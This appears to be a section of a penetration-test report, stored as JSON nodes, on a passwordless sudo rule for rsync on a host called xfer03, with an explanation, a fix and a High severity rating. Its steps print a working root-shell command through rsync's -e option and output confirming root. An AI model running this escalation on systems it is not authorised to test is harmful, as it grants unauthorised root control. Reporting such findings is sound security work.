{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-xfer:privesc:f-exam-xfer-rsync","gen":"d894cd2e"},"content":[{"type":"text","text":"Privilege escalation: Passwordless sudo on rsync gives root on xfer03"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" "},{"type":"text","text":"svc_backup","marks":[{"type":"code"}]},{"type":"text","text":" may run "},{"type":"text","text":"/usr/bin/rsync","marks":[{"type":"code"}]},{"type":"text","text":" as root with no password. rsync's "},{"type":"text","text":"-e","marks":[{"type":"code"}]},{"type":"text","text":" option runs "},{"type":"text","text":"any","marks":[{"type":"bold"}]},{"type":"text","text":" command, so it starts a root shell."}],"attrs":{"source":"finding:f-exam-xfer-rsync:explanation","gen":"76de1f9b"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Remove the sudo rule, or limit it to a wrapper script that takes no arguments."}],"attrs":{"source":"finding:f-exam-xfer-rsync:fix","gen":"8ee8cc46"}}
{"type":"paragraph","attrs":{"source":"finding:f-exam-xfer-rsync:severity","gen":"8372158f"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" High"}]}
{"type":"paragraph","attrs":{"source":"phase-steps:h-exam-xfer","gen":"8ec36930"},"content":[{"type":"text","text":"Steps to reproduce:","marks":[{"type":"bold"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-xfer-sudo:title","gen":"7af2e020"},"content":[{"type":"text","text":"What can I run with sudo?:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-xfer-sudo:0:command","gen":"2bce425e"},"content":[{"type":"text","text":"sudo -l"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-xfer-sudo:0:output","gen":"d5e2b8d8"},"content":[{"type":"text","text":"Matching Defaults entries for svc_backup on xfer03:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\n\\nUser svc_backup may run the following commands on xfer03:\\n    (root) NOPASSWD: /usr/bin/rsync"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-xfer-rsync:title","gen":"aae399ac"},"content":[{"type":"text","text":"Sudo rsync -e 'sh -c \\"sh 0<&2 1>&2\\"' 127.0.0.1:/dev/null:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-xfer-rsync:0:command","gen":"95d53ce3"},"content":[{"type":"text","text":"sudo rsync -e 'sh -c \\"sh 0<&2 1>&2\\"' 127.0.0.1:/dev/null\\nid"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-xfer-rsync:1:output","gen":"d9faee66"},"content":[{"type":"text","text":"uid=0(root) gid=0(root) groups=0(root)"}]}]}
